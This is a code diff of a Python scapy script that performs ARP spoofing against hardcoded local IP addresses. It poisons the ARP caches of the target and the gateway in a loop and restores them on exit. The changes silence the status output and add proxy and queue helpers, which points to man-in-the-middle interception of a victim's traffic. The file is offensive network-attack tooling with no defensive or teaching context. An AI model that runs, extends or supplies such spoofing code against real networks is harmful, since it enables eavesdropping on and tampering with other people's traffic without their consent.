@@ -5,8 +5,13 @@ import time
 import scapy.all as scapy
 
 from setting_reader import setting_read, setting_res
+from sh_files.sh_runner import queue_set, proxy_off
 
 mac = ""
+
+
+class NotRootUserError(Exception):
+    pass
 
 
 class ARP:
@@ -43,18 +48,21 @@ class ARP:
                 self.spoof(target_ip, gateway_ip)
                 self.spoof(gateway_ip, target_ip)
                 sent_packets_count = sent_packets_count + 2
-                print("\r[+] Packets sent: " + str(sent_packets_count), )
+                # print("\r[+] Packets sent: " + str(sent_packets_count), )
                 sys.stdout.flush()
                 time.sleep(2)
         except KeyboardInterrupt:
-            print("\n[+] Detected CTRL+C ...... Quitting")
+            # print("\n[+] Detected CTRL+C ...... Quitting")
             self.restore(target_ip, gateway_ip)
             self.restore(gateway_ip, target_ip)
+            proxy_off()
 
 
 if __name__ == '__main__':
     setting_read()
+    
 
     arp = ARP()
     # arp.to_arp(str(setting_res.get('server_ip')), str(setting_res.get('gateway_ip')))
     arp.to_arp("192.168.1.57", "192.168.1.45")
+
